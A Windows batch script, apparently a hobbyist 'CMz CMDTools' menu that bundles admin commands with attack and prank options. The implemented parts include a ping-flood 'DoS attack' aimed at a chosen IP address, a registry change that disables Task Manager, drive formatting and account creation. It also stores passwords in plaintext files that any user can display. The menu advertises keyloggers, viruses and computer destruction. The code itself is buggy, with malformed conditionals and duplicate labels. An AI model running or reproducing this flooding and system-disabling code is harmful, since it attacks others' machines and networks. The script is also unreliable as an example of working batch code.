@echo off
cls
color 0a
echo.
cls

::::BgetDescription#Mega-menu of useful scripts.
::::BgetAuthor#Logicbomb
::::BgetCategory#tools
::::Bgettags#menu;bundle;login
goto Registeration324

:restartcmd
cls
echo You have chosen to restart...
pause
start "C:\Users\%username%\Desktop\launcher.bat"

set p=b

set timed=%time%
set dated=%date%

echo User started at %time% on %date% with the username: %username% >> %appdata%\PandaRetail\logs\LogIns\%dated%-%timed%.txt
echo Error log for %timed%-%dated%::: >> %appdata%\CMDdev\logs\Errors\dev_cmd_err_%timed%.txt

goto begin

:Registeration324

( 
if exist username.dll goto login212
) 
else 
(
if exist registerusername.dll goto login2121 
)
if not exist username.dll goto register

:register
cls
echo Please Enter A Username And Password For The Program
echo.
Set username=
set /p username21=Username: 
Set password=
set /p password21=Password: 
echo %username21%>> username.dll
echo %password21%>> password.dll
goto login212

:login212
:begin121
cls
echo                       Hello
echo.
echo Login With The Username And Password That You Registered [Original Login Form]
echo.
echo If You Have Forgotted Your Username/Password/Register/Login Type Username or Password or Register or Login
echo.
set user=
set /p user11=Enter your username: 
if {%user11%}=={} goto :begin121
if {%user11%}=={Username} goto :forgotusername
if {%user11%}=={username} goto :forgotusername
if {%user11%}=={Password} goto :forgotpassword
if {%user11%}=={password} goto :forgotpassword
if {%user11%}=={Register} goto :registernewmember
if {%user11%}=={register} goto :registernewmember
if {%user11%}=={Login} goto :login2121
if {%user11%}=={login} goto :login2121
set authenticated=
for /f "tokens=*" %%a in (username.dll) do (
    if {%%a}=={%user11%} set authenticated=true

if not defined authenticated (echo Invalid Username & goto :begin121)
goto passwo
)

:forgotusername
echo Your Username Is :
for /f "Delims=" %%a in (username.dll) do (
echo %%a
)
pause>NUL
goto login212

:forgotpassword
echo You Password Is :
for /f "Delims=" %%a in (password.dll) do (
echo %%a
)
pause>NUL
goto login212


:passwo
set pass23=
set /p pass23=Enter your password: 
if {%pass23%}=={} goto :begin121
if {%pass23%}=={Username} goto :forgotusername
if {%pass23%}=={username} goto :forgotusername
if {%pass23%}=={Password} goto :forgotpassword
if {%pass23%}=={password} goto :forgotpassword
if {%pass23%}=={Register} goto :registernewmember
if {%pass23%}=={register} goto :registernewmember
if {%pass23%}=={Login} goto :login2121
if {%pass23%}=={login} goto :login2121
set authenticated=
for /f "tokens=*" %%a in (password.dll) do (
    if {%%a}=={%pass23%} set authenticated=true
)
if not defined authenticated (echo Invalid password & goto :begin121)
goto settitle

:registernewmember
cls
echo Please Enter A Username And Password For The Program
echo.
Set username=
set /p username2121=Username: 
Set password=
set /p password2121=Password: 
echo %username2121%>> registerusername.dll
echo %password2121%>> registerpassword.dll
goto login2121

:login2121
:begin2121
cls
echo Login With The Username And Password That You Registered [New Login Form]
echo.
echo If You Have Forgotted Your Username/Password/Register/Login Type Username or Password or Register or Login
echo.
set user=
set /p user111=Enter your username: 
if {%user111%}=={} goto :begin2121
if {%user111%}=={Username} goto :forgotusername1
if {%user111%}=={username} goto :forgotusername1
if {%user111%}=={Password} goto :forgotpassword1
if {%user111%}=={password} goto :forgotpassword1
if {%user111%}=={Register} goto :register
if {%user111%}=={register} goto :register
if {%user111%}=={Login} goto :login212
if {%user111%}=={login} goto :login212
set authenticated=
for /f "tokens=*" %%a in (registerusername.dll) do (
    if {%%a}=={%user111%} set authenticated=true

if not defined authenticated (echo Invalid Username & goto :begin2121)
goto passwo1
)

:forgotusername1
echo Your Username Is :
for /f "Delims=" %%a in (registerusername.dll) do (
echo %%a
)
pause>NUL
goto login2121

:forgotpassword1
echo You Password Is :
for /f "Delims=" %%a in (registerpassword.dll) do (
echo %%a
)
pause>NUL
goto login2121


:passwo1
set pass232=
set /p pass232=Enter your password: 
if {%pass232%}=={} goto :begin2121
if {%pass232%}=={Username} goto :forgotusername1
if {%pass232%}=={username} goto :forgotusername1
if {%pass232%}=={Password} goto :forgotpassword1
if {%pass232%}=={password} goto :forgotpassword1
if {%pass232%}=={Register} goto :register
if {%pass232%}=={register} goto :register
if {%pass232%}=={Login} goto :login212
if {%pass232%}=={login} goto :login212
set authenticated=
for /f "tokens=*" %%a in (registerpassword.dll) do (
    if {%%a}=={%pass232%} set authenticated=true
)
if not defined authenticated (echo Invalid password & goto :begin2121)
goto settitle

:settitle
cls
echo.
echo.
echo Please Choose A Title : 1-5
echo.
echo.
echo 1 To Have The Title [Time]
echo 2 To Have The Title [Date]
echo 3 To Have The Title [Time And Date]
echo 4 To Have The Title [Original]
echo 5 To Have The Title [Custom]

set /p settitle=Please Choose A Option (1 / 2 / 3 / 4 / 5) : 

if "%settitle%"=="1" goto titletime212
if "%settitle%"=="2" goto titledate212
if "%settitle%"=="3" goto titletimeanddate
if "%settitle%"=="4" goto titleoriginal
if "%settitle%"=="5" goto titlecustom

echo. Invailid Imput Please Try Again!
pause>NUL
goto settitle

:titletime212
title Time : %time%
goto startupbegin

:titledate212
title Date : %date%
goto startupbegin

:titletimeanddate
title Time : %time% Date : %date%
goto startupbegin

:titleoriginal
title 103 Option CMD Beta By [RMz-Panda]
goto startupbegin

:titlecustom
cls
echo Set The Title To Whatever You Would Like

set /p title=Title : 
title %title%
goto startupbegin

:startupbegin
cls
echo You Computer Name : %username%
echo System root: %systemroot% Windows directory: %windir%
echo.
echo.
echo.
echo Hello This Is My 103 BETA CMD Option By [RMz-Panda]
echo.
echo Please Ensure That You Will NOT 
echo TAKE THE CREDIT FOR MAKING THIS.
echo.
echo If You Take Any Credit For This 
echo You Will Be Going Against The CopyRights ILEGALLY.
echo.
echo copyrights (C) 2011-2013 RetailModz.com
echo.
echo Please Hit Any Key To Continue To The Sexy Menu.
pause>nul
goto begin

:begin
if "%s%"=="70" goto trialversionend
cls
echo.
echo.
echo You are logged in as: %username%
echo System root: %systemroot% Windows directory: %windir%
echo.
echo ------------------
echo  .::THE MENU::.
echo ------------------
echo.
echo ------------------
echo   .::Page 1::.
echo ------------------ 
echo.
echo.
echo 1  - Launch CMD.
echo 2  - Display user info
echo 3  - Change a users password
echo 4  - System info
echo 5  - All info about your IP
echo 6  - PC'S on the network
echo 7  - View all users on pc
echo 8  - View Instructions
echo 9  - CMD chat
echo 10 - Ping a website
echo 11 - Copy a file
echo 12 - Delete a file
echo 13 - Create a *.* file 
echo 14 - Open a file
echo 15 - Check file extension
echo 16 - Format a drive
echo 17 - Open System32 file
echo 18 - Make a user an admin
echo 19 - Check internet connection
echo 20 - Clean TEMP folders
echo 21 - Disable TaskMgr
echo 22 - Refresh Internet connection
echo 23 - Disable internet connection
echo 24 - Start Registry Editor
echo 25 - Change time/date
echo 26 - Start Control Manager
echo 27 - Trace Route
echo 28 - DoS attack
echo 29 - Shutdown any computer on network
echo 30 - Get a friends ip address
echo 31 - Pass Generator
echo 32 - Crash computer
echo 33 - Spam desktop [Win 7]
echo 34 - Spam desktop [Win XP]
echo 35 - Attempt to destoy computer [THIS IS IRREVSIBLE!!!!]
echo 36 - Start a program or process
echo 37 - End a program or process
echo 38 - Display a list of running processes
echo 39 - Log out
echo 40 - Shutdown instantly
echo 41 - Restart computer
echo 42 - View live time
echo 43 - Version info
echo 44 - Check if something exists
echo 45 - Check what drives are active
echo 46 - Use command line from CMz CMDTools itself
echo 47 - Create a CMD virus
echo 48 - Start %systemroot%
echo 49 - Start C:\
echo 50 - Restart CMz CMDTools
echo 51 - Basic Keylogger
echo 52 - Site selector
echo 53 - Calculator
echo 54 - Find text in a file(s)
echo 55 - Start telnet
echo 56 - [TELNET] Star wars movie
echo 57 - Set a command to be run after a countdown 
echo 58 - Happy virus
echo 59 - Reminder in a message box after timer
echo 60 - Start any program minimized
echo 61 - Get Admin CMD
echo 62 - Attack Website
echo 63 - Add/Remove Programs
echo 64 - Administrative Tools
echo 65 - Bluetooth Transfer Wizard
echo 66 - Character Map
echo 67 - Folders Properties
echo 68 - Fonts
echo 69 - Game Controllers
echo 70 - Event Viewer
echo 71 - Group Policy Editor (for xp professional)
echo 72 - Hyper Terminal
echo 73 - Iexpress Wizard
echo 74 - Syncronization Tool
echo 75 - Mouse Properties
echo 76 - On Screen Keyboard
echo 77 - ODBC Data Source Administrator
echo 78 - Password Properties
echo 79 - Phone Dialer
echo 80 - Libraries
echo 81 - Advanced Login System
echo 82 - Game
echo 83 - Password Crack
echo 84 - Funny Virus
echo 85 - Destroy Websites
echo 86 - Google Tricks
echo 87 - Be Admin On A School Computer Or Blocked Computer [XP ONLY]
echo 88 - Unlock Secret Powerful Administrator [Must Run This As Admin First]
echo 89 - Turn Off Secret Admin [Must Run This As Admin First]
echo 90 - View Or Make Changes To Boot Configuration Data
echo 91 - Copy Boot Files To The System Partition
echo 92 - Display Or Change Audit Policies
echo 93 - Change The Attributes Of A Single File Or A Directory
echo 94 - Display Or Change Entries In The ARP Cache
echo 95 - [Doesn't Work] JailBreak Iphone 4S and iPad 2 [Must Have Certain Files]
echo 96 - Editable CMD
echo 97 - Progress Bar
echo 98 - Create Your Own FAKE Windows Error
echo 99 - Change Colors Of The Menu
echo.
echo.
echo next - Go To Second Page


echo.
echo Your last selection was: %begin%
set /p begin=Please select one of the numbers above:

echo.
echo.
echo.
echo copyrights (C) 2011-2013 CleanModz.com
echo.
 
echo Last option selected at: Date: %date% At the time: %time% With the username: %username% >> %userprofile%\%appdata%\Logs\lastoption.txt
if "%begin%"=="1" goto cmd
if "%begin%"=="2" goto info
if "%begin%"=="3" goto password
if "%begin%"=="4" goto sysinfo
if "%begin%"=="5" goto ipcfg
if "%begin%"=="6" goto network
if "%begin%"=="7" goto users
if "%begin%"=="8" goto instr
if "%begin%"=="9" goto chat
if "%begin%"=="10" goto ping
if "%begin%"=="11" goto copy
if "%begin%"=="12" goto delete
if "%begin%"=="13" goto txtfile
if "%begin%"=="14" goto fileopen
if "%begin%"=="15" goto assoc
if "%begin%"=="16" goto format
if "%begin%"=="17" goto sys32
if "%begin%"=="18" goto mkadmin
if "%begin%"=="19" goto chkinter
if "%begin%"=="20" goto clean
if "%begin%"=="21" goto tskmgr
if "%begin%"=="22" goto refint
if "%begin%"=="23" goto disint
if "%begin%"=="24" goto regedit
if "%begin%"=="25" goto timedate
if "%begin%"=="26" goto controlp
if "%begin%"=="27" goto tracert
if "%begin%"=="28" goto dos
if "%begin%"=="29" goto shutdown
if "%begin%"=="30" goto findip
if "%begin%"=="31" goto passgen
if "%begin%"=="32" goto crash
if "%begin%"=="33" goto spam
if "%begin%"=="34" goto spamwinxp
if "%begin%"=="35" goto destroy
if "%begin%"=="36" goto startpro
if "%begin%"=="37" goto endpro
if "%begin%"=="38" goto runningpro
if "%begin%"=="39" goto logout
if "%begin%"=="40" goto shutdown
if "%begin%"=="41" goto restart
if "%begin%"=="42" goto livetime
if "%begin%"=="43" goto verinfo
if "%begin%"=="44" goto procheck
if "%begin%"=="45" goto drives
if "%begin%"=="46" goto command
if "%begin%"=="47" goto usvir
if "%begin%"=="48" goto systemroot
if "%begin%"=="49" goto startc
if "%begin%"=="50" goto restartcmd
if "%begin%"=="51" goto keylog
if "%begin%"=="52" goto siteselect
if "%begin%"=="53" goto calc
if "%begin%"=="54" goto findtxt
if "%begin%"=="55" goto telnet
if "%begin%"=="56" goto starwars
if "%begin%"=="57" goto timercommand
if "%begin%"=="58" goto happyvir
if "%begin%"=="59" goto remind
if "%begin%"=="60" goto startmin
if "%begin%"=="61" goto admincmd
if "%begin%"=="62" goto websiteattack
if "%begin%"=="63" goto addremoveprogram
if "%begin%"=="64" goto administrativetools
if "%begin%"=="65" goto bluetooth
if "%begin%"=="66" goto charmap
if "%begin%"=="67" goto folders
if "%begin%"=="68" goto fonts
if "%begin%"=="69" goto game
if "%begin%"=="70" goto viewer
if "%begin%"=="71" goto group
if "%begin%"=="72" goto hyper
if "%begin%"=="73" goto express
if "%begin%"=="74" goto sync
if "%begin%"=="75" goto mouse
if "%begin%"=="76" goto keyboard
if "%begin%"=="77" goto data
if "%begin%"=="78" goto password32
if "%begin%"=="79" goto dial
if "%begin%"=="80" goto explorer
if "%begin%"=="81" goto advancedlogin
if "%begin%"=="82" goto menu
if "%begin%"=="83" goto passwordcrack
if "%begin%"=="84" goto fakevirus
if "%begin%"=="85" goto destroy2012
if "%begin%"=="86" goto googletricks
if "%begin%"=="87" goto HEADER
if "%begin%"=="88" goto unlockadmin 
if "%begin%"=="89" goto delockadmin
if "%begin%"=="90" goto bootchange
if "%begin%"=="91" goto copyboot
if "%begin%"=="92" goto audit
if "%begin%"=="93" goto attributes
if "%begin%"=="94" goto arp
if "%begin%"=="95" goto jailbreak
if "%begin%"=="96" goto editcmdd
if "%begin%"=="97" goto progressbar
if "%begin%"=="98" goto windowserror321
if "%begin%"=="99" goto batchcolorchanger
if "%begin%"=="next" goto begin2

echo Invailid Imput. Please Try Again!
goto begin

echo.
echo.
echo.
echo copyrights (C) 2011-2013 RetailModz.com
echo.

:begin2
if "%s%"=="70" goto trialversionend
cls
echo.
echo.
echo You are logged in as: %username%
echo System root: %systemroot% Windows directory: %windir%
echo.
echo ------------------
echo  .::THE MENU::.
echo ------------------
echo.
echo ------------------
echo   .::Page 2::.
echo ------------------ 
echo.
echo.
echo.
echo prev - Go Back To Page 1
echo.
echo.
echo 1 - Put "%username%" Admin (Must Have Password)
echo 2 - Force Stop A Program
echo 3 - Advanced Way To Repeat What You Type
echo 4 - To Show Your Tastlist	
echo.
echo.
echo Your last selection was: %begin2%
set /p begin2=Please select one of the numbers above:

echo.
echo.
echo.
echo copyrights (C) 2011-2013 RetailModz.com
echo.
 
echo Last option selected at: Date: %date% At the time: %time% With the username: %username% >> %userprofile%\%appdata%\Logs\lastoption.txt
if "%begin2%"=="prev" goto begin
if "%begin2%"=="1" goto setuseradmin212
if "%begin2%"=="2" goto forcestop
if "%begin2%"=="3" goto test21212121
if "%begin2%"=="4" goto tasklistenable




echo Invailid Imput. Please Try Again!
goto begin2

echo.
echo.
echo.
echo copyrights (C) 2011-2013 CleanModz.com
echo.


:cmd

start cmd.exe
goto begin

:password
set p2=t
set /p n=USER:::
echo The username is being processed...
echo ...
echo ...
echo The user you have chosen is %n%
echo Are you sure you want the change the users password?
set /p begin2= Please type yes or no::
if "%begin2%"=="yes" goto next
if "%begin2%"=="no" goto begin
if "%begin2%"=="Yes" goto next
if "%begin2%"=="No" goto begin

:next

net user %n% *

set /p begin3= Would you like to select another option? [Y/N]:: 
if "%begin3%"=="Y" goto begin
if "%begin3%"=="y" goto begin
if "%begin3%"=="yes" goto begin
if "%begin3%"=="Yes" goto begin

if "%begin3%"=="N" goto exit4
if "%begin3%"=="n" goto exit4
if "%begin3%"=="no" goto exit4
if "%begin3%"=="No" goto exit4



:info

set /p m=USER:::
echo The username is being processed...
echo ...
echo ...
echo The user you have chosen is %m%
net user %m% 
pause

set /p begin3= Would you like to select another option? [Y/N]:: 
if "%begin3%"=="Y" goto begin
if "%begin3%"=="y" goto begin
if "%begin3%"=="yes" goto begin
if "%begin3%"=="Yes" goto begin

if "%begin3%"=="N" goto exit4
if "%begin3%"=="n" goto exit4
if "%begin3%"=="no" goto exit4
if "%begin3%"=="No" goto exit4


:sysinfo
echo.
echo Computer info..
echo.
echo Date: %date%
echo TIME: %time%
echo Computername: %computername%
echo User: %username%
echo Sysdrive: %systemdrive%
echo Domain: %userdomain%
echo Logon Sever: %logonserver%
echo Windowsroot: %windir%
set p3=c
echo Programs On: %programfiles%
echo Profile on: %userprofile%
echo Temp map: %temp%
echo.
set /p begin4= Would you like to select another option? [Y/N]:: 
if "%begin4%"=="Y" goto begin
if "%begin4%"=="y" goto begin
if "%begin4%"=="yes" goto begin
if "%begin4%"=="Yes" goto begin

if "%begin4%"=="N" goto exit4
if "%begin4%"=="n" goto exit4
if "%begin4%"=="no" goto exit4
if "%begin4%"=="No" goto exit4


:network
echo.
echo Computers on the Local network:
echo.
net view
echo.
set /p begin5= Would you like to select another option? [Y/N]:: 
if "%begin5%"=="Y" goto begin
if "%begin5%"=="y" goto begin
if "%begin5%"=="yes" goto begin
if "%begin5%"=="Yes" goto begin

if "%begin5%"=="N" goto exit4
if "%begin5%"=="n" goto exit4
if "%begin5%"=="no" goto exit4
if "%begin5%"=="No" goto exit4


:users
echo All users on this pc:
net user
echo.
set /p begin6= Would you like to select another option? [Y/N]:: 
if "%begin6%"=="Y" goto begin
if "%begin6%"=="y" goto begin
if "%begin6%"=="yes" goto begin
if "%begin6%"=="Yes" goto begin
set p5=h
if "%begin6%"=="N" goto exit4
if "%begin6%"=="n" goto exit4
if "%begin6%"=="no" goto exit4
if "%begin6%"=="No" goto exit4



:ipcfg
echo.
ipconfig /all
echo.
set /p begin7= Would you like to select another option? [Y/N]:: 
if "%begin7%"=="Y" goto begin
if "%begin7%"=="y" goto begin
if "%begin7%"=="yes" goto begin
if "%begin7%"=="Yes" goto begin

if "%begin7%"=="N" goto exit4
if "%begin7%"=="n" goto exit4
if "%begin7%"=="no" goto exit4
if "%begin7%"=="No" goto exit4

:exit4

cls 
echo Thank you for using CMz CMD tools
echo.
echo Created by PandRetail
echo.
echo CMz CMDTools V0.1.2 is created, compiled and distributed by PandaRetail and its registered clients     [CMz] CleanModz.com
echo.
echo Hello Fellow User Of "CMz CMD Tools," The Newest Version Will Have Many New     Things Especially A New Menu Lay Out
echo.
echo.
set p4=c
echo.
echo.
echo.
echo.
echo.
echo.
pause
exit

:instr

echo YOU WILL FIND THE INSTRUCTIONS IN THE CURRENT DIRECTORY!!!
echo Welcome to RMz CMD tools the best tool for basic "CMDing" EVER. To use this simply follow the instructions on the command prompt! Its that simple!!! > Instructions.txt
set /p begin7= Would you like to select another option? [Y/N]:: 
if "%begin7%"=="Y" goto begin
if "%begin7%"=="y" goto begin
if "%begin7%"=="yes" goto begin
if "%begin7%"=="Yes" goto begin

if "%begin7%"=="N" goto exit4
if "%begin7%"=="n" goto exit4
if "%begin7%"=="no" goto exit4
if "%begin7%"=="No" goto exit4


:chat
@echo off
cls

title CMD Chat
attrib -h -s chat.txt >nul
color 0a
set /p user=Chat username: 
goto check

:get
@echo user chat> ftp_cmd.dat
@echo chat>> ftp_cmd.dat
@echo bin>> ftp_cmd.dat
@echo GET chat.txt>>ftp_cmd.dat
@echo quit>> ftp_cmd.dat
cls
echo Refreshing..
ftp -n -s:ftp_cmd.dat ftp.ftpwt.com >nul
del "ftp_cmd.dat" >nul
goto chat

:send
@echo user chat> ftp_cmd.dat
@echo chat>> ftp_cmd.dat
@echo bin>> ftp_cmd.dat
@echo SEND chat.txt>>ftp_cmd.dat
@echo quit>> ftp_cmd.dat
echo Refreshing...
ftp -n -s:ftp_cmd.dat ftp.ftpwt.com >nul
del "ftp_cmd.dat" >nul
goto get

:check
attrib -h -s chat.txt >nul
if not exist chat.txt goto make
:chat
cls
attrib -h -s chat.txt >nul
type chat.txt
if %user%==Dezinated goto A
attrib +h +s chat.txt >nul
:A

set /p chat=%user%: 
cls
if /i "%chat%"=="r" goto get
echo Sending...
goto C
:B

echo %user%: %chat% >> chat.txt
goto send
:make

goto get

:C
@echo user chat> ftp_cmd.dat
@echo chat>> ftp_cmd.dat
@echo bin>> ftp_cmd.dat
@echo GET chat.txt>>ftp_cmd.dat
@echo quit>> ftp_cmd.dat
cls
echo Refreshing..
ftp -n -s:ftp_cmd.dat ftp.ftpwt.com >nul
del "ftp_cmd.dat" >nul
goto B

set /p begin8= Would you like to select another option? [Y/N]:: 
if "%begin8%"=="Y" goto begin
if "%begin8%"=="y" goto begin
if "%begin8%"=="yes" goto begin
if "%begin8%"=="Yes" goto begin

if "%begin8%"=="N" goto exit4
if "%begin8%"=="n" goto exit4
if "%begin8%"=="no" goto exit4
if "%begin8%"=="No" goto exit4

:ping

set /p n= What website do you want to ping?
echo The website you have chosen is %n%
echo pinging %n% with 32 bytes of data
ping %n%
pause
set /p begin9= Would you like to select another option? [Y/N]:: 
if "%begin9%"=="Y" goto begin
if "%begin9%"=="y" goto begin
if "%begin9%"=="yes" goto begin
if "%begin9%"=="Yes" goto begin

if "%begin9%"=="N" goto exit4
if "%begin9%"=="n" goto exit4
if "%begin9%"=="no" goto exit4
if "%begin9%"=="No" goto exit4

if "%begin9%"=="666" goto awesome


:copy 

set /p n= Enter the filename that you want to copy:::
echo Filename: %n%
copy %n%
echo.
echo.
set /p begin10= Would you like to select another option? [Y/N]:: 
if "%begin10%"=="Y" goto begin
if "%begin10%"=="y" goto begin
if "%begin10%"=="yes" goto begin
if "%begin10%"=="Yes" goto begin

if "%begin10%"=="N" goto exit4
if "%begin10%"=="n" goto exit4
if "%begin10%"=="no" goto exit4
if "%begin10%"=="No" goto exit4

:delete

set /p n= Enter the file you want to delete:::
echo The file you want to delete is called %n%
set /p question= Are you sure you want to delete this file? [Y/N] :::
if "%begin4%"=="Y" goto delete1
if "%begin4%"=="y" goto delete1
if "%begin4%"=="yes" goto delete1
if "%begin4%"=="Yes" goto delete1

if "%begin4%"=="N" goto begin
if "%begin4%"=="n" goto begin
if "%begin4%"=="no" goto begin
if "%begin4%"=="No" goto begin

:delete1

set /p m= Please re-enter file to be deleted:::
echo The file will now be deleted!
del %m%
echo.
echo.
set /p begin11= Would you like to select another option? [Y/N]:: 
if "%begin11%"=="Y" goto begin
if "%begin11%"=="y" goto begin
if "%begin11%"=="yes" goto begin
if "%begin11%"=="Yes" goto begin

if "%begin11%"=="N" goto exit4
if "%begin11%"=="n" goto exit4
if "%begin11%"=="no" goto exit4
if "%begin11%"=="No" goto exit4

:txtfile

echo The text file is outputted to the current directory!!!
set /p o=Enter text you would like to put in file:::
set /p f=What would you like the file to be called? 
set /p e=What file extension would you like it to be? [WITH DOT]:::
echo %o% > %f%.%e%
start %f%.%e%
echo.
set /p begin12= Would you like to select another option? [Y/N]:: 
if "%begin12%"=="Y" goto begin
if "%begin12%"=="y" goto begin
if "%begin12%"=="yes" goto begin
if "%begin12%"=="Yes" goto begin

if "%begin12%"=="N" goto exit4
if "%begin12%"=="n" goto exit4
if "%begin12%"=="no" goto exit4
if "%begin12%"=="No" goto exit4

:fileopen

set /p p= File to be opened:::
set /p e= File extension [WITH DOT]:::
echo The file you have chosen is called: %p%%e%
start %p%%e%
echo.
set /p begin13= Would you like to select another option? [Y/N]:: 
if "%begin13%"=="Y" goto begin
if "%begin13%"=="y" goto begin
if "%begin13%"=="yes" goto begin
if "%begin13%"=="Yes" goto begin

if "%begin13%"=="N" goto exit4
if "%begin13%"=="n" goto exit4
if "%begin13%"=="no" goto exit4
if "%begin13%"=="No" goto exit4

:assoc

set /p t= Enter a file extension [WITH DOT] :::
echo The file extension you have entered is::: %t%
assoc %t%
pause 
echo.
echo.
set /p begin14= Would you like to select another option? [Y/N]:: 
if "%begin14%"=="Y" goto begin
if "%begin14%"=="y" goto begin
if "%begin14%"=="yes" goto begin
if "%begin14%"=="Yes" goto begin

if "%begin14%"=="N" goto exit4
if "%begin14%"=="n" goto exit4
if "%begin14%"=="no" goto exit4
if "%begin14%"=="No" goto exit4

:format
set /p y= What drive do you want to format? [e.g. C: D: E:] :::
if "%y%"=="C:" goto sure
if "%y%"=="D:" goto sure
if "%y%"=="E:" goto sure
if "%y%"=="F:" goto sure
echo "%y%" Sorry, that drive doesn't exist!!!
:sure 
echo.
echo.
set /p question1= Are you sure you want to format the drive %y%? [Y/N] :::
if "%question1%"=="Y" goto format1
if "%question1%"=="y" goto format1
if "%question1%"=="yes" goto format1
if "%question1%"=="Yes" goto format

if "%question1%"=="N" goto begin
if "%question1%"=="n" goto begin
if "%question1%"=="no" goto begin
if "%question1%"=="No" goto begin

:format1

echo CMz CMDTools will now format the drive %y%
pause
format %y%
echo.
echo.
set /p begin15= Would you like to select another option? [Y/N]:: 
if "%begin15%"=="Y" goto begin
if "%begin15%"=="y" goto begin
if "%begin15%"=="yes" goto begin
if "%begin15%"=="Yes" goto begin

if "%begin15%"=="N" goto exit4
if "%begin15%"=="n" goto exit4
if "%begin15%"=="no" goto exit4
if "%begin15%"=="No" goto exit4


:sys32
start C:\WINDOWS\system32
pause
set /p begin16= Would you like to select another option? [Y/N]:: 
if "%begin16%"=="Y" goto begin
if "%begin16%"=="y" goto begin
if "%begin16%"=="yes" goto begin
if "%begin16%"=="Yes" goto begin

if "%begin16%"=="N" goto exit4
if "%begin16%"=="n" goto exit4
if "%begin16%"=="no" goto exit4
if "%begin16%"=="No" goto exit4


:mkadmin
echo.
echo.
set /p name= Enter user name: 
set /p pass= Enter password: 
net user %name% %pass% /add 
pause
set /p begin17= Would you like to select another option? [Y/N]:: 
if "%begin17%"=="Y" goto begin
if "%begin17%"=="y" goto begin
if "%begin17%"=="yes" goto begin
if "%begin17%"=="Yes" goto begin

if "%begin17%"=="N" goto exit4
if "%begin17%"=="n" goto exit4
if "%begin17%"=="no" goto exit4
if "%begin17%"=="No" goto exit4

:chkinter

ping www.google.com
pause
echo.
echo.
set /p begin18= Would you like to select another option? [Y/N]:: 
if "%begin18%"=="Y" goto begin
if "%begin18%"=="y" goto begin
if "%begin18%"=="yes" goto begin
if "%begin18%"=="Yes" goto begin

if "%begin18%"=="N" goto exit4
if "%begin18%"=="n" goto exit4
if "%begin18%"=="no" goto exit4
if "%begin18%"=="No" goto exit4



:clean
echo Cleaning "TEMP" folders
del /Q /F %temp% >nul
pause 
set /p begin19= Would you like to select another option? [Y/N]:: 
if "%begin19%"=="Y" goto begin
if "%begin19%"=="y" goto begin
if "%begin19%"=="yes" goto begin
if "%begin19%"=="Yes" goto begin

if "%begin19%"=="N" goto exit4
if "%begin19%"=="n" goto exit4
if "%begin19%"=="no" goto exit4
if "%begin19%"=="No" goto exit4

:tskmgr
echo Please Type The Letter
echo.
echo Are You Sure You Want To Disable You're TaskManager?
echo.
echo Y - Yes
echo.
echo N - NO
set /p tskmgr=[Y/N] : 

if "%tskmgr%"=="Y" goto startdisable
if "%tskmgr%"=="y" goto startdisable
if "%tskmgr%"=="N" goto endish
if "%tskmgr%"=="N" goto endish

echo That Is An Invailid Answer
pause
goto tskmgr

:startdisable
echo RMz CMDTools will now disble TaskMgr
pause
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
pause
set /p begin20= Would you like to select another option? [Y/N]:: 
if "%begin20%"=="Y" goto begin
if "%begin20%"=="y" goto begin
if "%begin20%"=="yes" goto begin
if "%begin20%"=="Yes" goto begin

if "%begin20%"=="N" goto exit4
if "%begin20%"=="n" goto exit4
if "%begin20%"=="no" goto exit4
if "%begin20%"=="No" goto exit4

:refint

echo Disabling internet connection...
ipconfig /release
pause
echo Renewing internet connection
ipconfig /renew
pause
set /p begin21= Would you like to select another option? [Y/N]:: 
if "%begin21%"=="Y" goto begin
if "%begin21%"=="y" goto begin
if "%begin21%"=="yes" goto begin
if "%begin21%"=="Yes" goto begin

if "%begin21%"=="N" goto exit4
if "%begin21%"=="n" goto exit4
if "%begin21%"=="no" goto exit4
if "%begin21%"=="No" goto exit4

:disint

echo CMz CMDTools will now disable your internet connection...
ipconfig /release
pause
set /p begin22= Would you like to select another option? [Y/N]:: 
if "%begin22%"=="Y" goto begin
if "%begin22%"=="y" goto begin
if "%begin22%"=="yes" goto begin
if "%begin22%"=="Yes" goto begin

if "%begin22%"=="N" goto exit4
if "%begin22%"=="n" goto exit4
if "%begin22%"=="no" goto exit4
if "%begin22%"=="No" goto exit4

:regedit

start regedit.exe
echo Regedit should have started...
pause
set /p begin25= Would you like to select another option? [Y/N]:: 
if "%begin25%"=="Y" goto begin
if "%begin25%"=="y" goto begin
if "%begin25%"=="yes" goto begin
if "%begin25%"=="Yes" goto begin

if "%begin25%"=="N" goto exit4
if "%begin25%"=="n" goto exit4
if "%begin25%"=="no" goto exit4
if "%begin25%"=="No" goto exit4


:timedate

set /p t=Enter the new time [eg. HH:MM:SS AM/PM] ::: 
time %t%
set /p begin23= Would you like to change date as well? [Y/N]:: 
if "%begin23%"=="Y" goto date
if "%begin23%"=="y" goto date
if "%begin23%"=="yes" goto date
if "%begin23%"=="Yes" goto date

if "%begin23%"=="N" goto begin
if "%begin23%"=="n" goto begin
if "%begin23%"=="no" goto begin
if "%begin23%"=="No" goto begin

:date

set /p date1= Enter the new date [DD:MM:YYYY] ::
date %date1%
pause
 set /p begin24= Would you like to select another option? [Y/N]:: 
if "%begin24%"=="Y" goto begin
if "%begin24%"=="y" goto begin
if "%begin24%"=="yes" goto begin
if "%begin24%"=="Yes" goto begin

if "%begin24%"=="N" goto exit4
if "%begin24%"=="n" goto exit4
if "%begin24%"=="no" goto exit4
if "%begin24%"=="No" goto exit4

:controlp

start Control
pause
 set /p begin25= Would you like to select another option? [Y/N]:: 
if "%begin25%"=="Y" goto begin
if "%begin25%"=="y" goto begin
if "%begin25%"=="yes" goto begin
if "%begin25%"=="Yes" goto begin

if "%begin25%"=="N" goto exit4
if "%begin25%"=="n" goto exit4
if "%begin25%"=="no" goto exit4
if "%begin25%"=="No" goto exit4

:tracert

set /p y= IP or URL:::
tracert %y%
pause
 set /p begin26= Would you like to select another option? [Y/N]:: 
if "%begin26%"=="Y" goto begin
if "%begin26%"=="y" goto begin
if "%begin26%"=="yes" goto begin
if "%begin26%"=="Yes" goto begin

if "%begin26%"=="N" goto exit4
if "%begin26%"=="n" goto exit4
if "%begin26%"=="no" goto exit4
if "%begin26%"=="No" goto exit4

:dos

echo Use this after you have found the ip address of the website using Trace Route feature
set /p w= IP address:::
set /p p= Buffer size (0-65500):::
echo You have chosen %w% to be pinged with %p% packets
ping -t %w% -l %p% -n 1000000
pause
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
